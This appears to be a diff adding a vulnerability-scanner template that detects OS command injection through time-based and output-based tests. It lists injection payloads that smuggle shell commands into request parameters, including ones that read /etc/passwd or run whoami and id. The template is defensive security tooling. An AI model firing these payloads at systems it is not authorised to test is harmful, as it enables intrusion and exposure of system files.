@@ -1,0 +1,184 @@
+id: command-injection
+
+info:
+  name: OS Command Injection
+  author: Flawfence
+  severity: critical
+  description: |
+    Detects command injection vulnerabilities by testing various injection payloads
+    across different parts of HTTP requests including query parameters, form data,
+    headers, and cookies. Uses time-based detection and output-based detection methods.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://portswigger.net/web-security/os-command-injection
+  tags: injection,rce,command-injection,dast
+  classification:
+    cwe-id: CWE-78
+    cve-id: N/A
+
+variables:
+  # Random values for time-based detection
+  sleep_time: "{{rand_int(5, 8)}}"
+  # Unique marker for output detection
+  marker: "{{rand_text_alpha(8)}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+        condition: or
+
+    payloads:
+      # Time-based command injection payloads
+      time_payloads:
+        - "; sleep {{sleep_time}} #"
+        - "| sleep {{sleep_time}} #"
+        - "& sleep {{sleep_time}} #"
+        - "&& sleep {{sleep_time}} #"
+        - "|| sleep {{sleep_time}} #"
+        - "`sleep {{sleep_time}}`"
+        - "$(sleep {{sleep_time}})"
+        - "; ping -c {{sleep_time}} 127.0.0.1 #"
+        - "| ping -c {{sleep_time}} 127.0.0.1 #"
+        - "& ping -c {{sleep_time}} 127.0.0.1 #"
+        - "; timeout {{sleep_time}} #"
+        - "| timeout {{sleep_time}} #"
+        - "& timeout {{sleep_time}} #"
+        - "%3B sleep {{sleep_time}} %23"
+        - "%7C sleep {{sleep_time}} %23"
+        - "%26 sleep {{sleep_time}} %23"
+        - "%0A sleep {{sleep_time}} %0A"
+        - "%0D sleep {{sleep_time}} %0D"
+
+      # Output-based command injection payloads
+      output_payloads:
+        - "; echo {{marker}} #"
+        - "| echo {{marker}} #"
+        - "& echo {{marker}} #"
+        - "&& echo {{marker}} #"
+        - "|| echo {{marker}} #"
+        - "`echo {{marker}}`"
+        - "$(echo {{marker}})"
+        - "; cat /etc/passwd #"
+        - "| cat /etc/passwd #"
+        - "& cat /etc/passwd #"
+        - "; whoami #"
+        - "| whoami #"
+        - "& whoami #"
+        - "; id #"
+        - "| id #"
+        - "& id #"
+        - "; ls -la #"
+        - "| ls -la #"
+        - "& ls -la #"
+        - "%3B echo {{marker}} %23"
+        - "%7C echo {{marker}} %23"
+        - "%26 echo {{marker}} %23"
+        - "%0A echo {{marker}} %0A"
+        - "%0D echo {{marker}} %0D"
+
+    # Time-based detection requests
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{time_payloads}}"
+
+    # Time-based analyzer for verification
+    analyzer:
+      name: time_delay
+      parameters:
+        sleep_duration: "{{sleep_time}}"
+        requests_limit: 4
+        time_correlation_error_range: 0.20
+        time_slope_error_range: 0.35
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      # Time-based detection
+      - type: word
+        name: time-based-injection
+        part: analyzer
+        words:
+          - "true"
+
+  # Output-based detection requests
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET" || method == "POST"'
+        condition: or
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{output_payloads}}"
+
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{output_payloads}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      # Output-based detection
+      - type: word
+        name: marker-injection
+        part: body
+        words:
+          - "{{marker}}"
+
+      - type: regex
+        name: passwd-file
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "bin:.*:2:2:"
+
+      - type: regex
+        name: whoami-output
+        part: body
+        regex:
+          - "^(root|www-data|apache|nginx|nobody|daemon)$"
+
+      - type: regex
+        name: id-output
+        part: body
+        regex:
+          - "uid=\\d+\\([^)]+\\)\\s+gid=\\d+\\([^)]+\\)"
+
+      - type: regex
+        name: ls-output
+        part: body
+        regex:
+          - "total \\d+"
+          - "drwx.*\\s+\\d+\\s+"
+          - "-rw.*\\s+\\d+\\s+"
+
+      - type: word
+        name: windows-commands
+        part: body
+        words:
+          - "Volume in drive"
+          - "Directory of"
+          - "Windows IP Configuration"
+          - "Microsoft Windows"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: command-output
+        part: body
+        regex:
+          - '(?s){{marker}}.*'
+        group: 0
